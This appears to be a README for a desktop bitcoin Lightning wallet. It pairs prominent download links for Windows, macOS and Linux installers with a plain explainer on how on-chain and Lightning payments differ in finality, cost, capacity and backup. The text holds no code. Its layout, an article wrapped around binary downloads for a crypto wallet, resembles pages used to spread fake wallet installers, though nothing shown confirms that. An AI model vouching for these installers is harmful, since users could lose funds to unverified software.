<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Bitcoin wallet vs Lightning wallet: what actually differs
Same money, different rail: finality, cost, capacity and what a backup has to contain.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

The names suggest two products. The difference is the rail the money travels on, and it changes four
things a user can feel.

## Finality

An on-chain payment is final when it confirms, and it is reversible-looking before then: it sits in the
mempool, and a low fee can leave it there for hours. A Lightning payment is final in about a second,
with no intermediate state anyone can act on.

## Cost

On-chain pays for block space, which is priced by demand and can spike. Lightning pays routing fees of
a fraction of a satoshi, plus the on-chain cost of opening and closing the channel. For many small
payments Lightning is far cheaper; for one large transfer, on-chain often wins.

## Capacity

An on-chain balance is spendable in full, minus the fee. A Lightning balance is constrained by channel
capacity, which is why a wallet can hold enough and still fail to send. That is the single most
confusing difference for a new user, and it is not a bug.

## Backup

An on-chain wallet is restored by a seed phrase, fully. A Lightning wallet also needs the channel state
to bring back channel balances, which is why wallets produce a separate channel backup. Same phrase,
more to keep.

## Which to use

On-chain for savings and for large, infrequent transfers. Lightning for spending, tipping and anything
where waiting ten minutes is absurd. Most people end up using both from one application.

## What does not differ

The bitcoin. A Lightning balance is not a different asset; it is bitcoin held in a channel. Security
still rests on the base layer, and the same rules about keys apply.

## Questions people ask

### Can I pay an on-chain address from a Lightning wallet?

Only with its on-chain send, which is a different operation.

### Is Lightning money worth less?

No. It is the same bitcoin, in a channel rather than at an address.

### Do I need two wallets?

Not necessarily. One application usually handles both rails, as this one does.

## Related guides

- [What a Lightning wallet is, in plain terms](https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/what-is-a-lightning-wallet.md)
- [What the Lightning Network is and how a payment moves](https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/what-is-the-lightning-network.md)
- [Sending bitcoin between the on-chain network and Lightning](https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/on-chain-to-lightning-transfers.md)

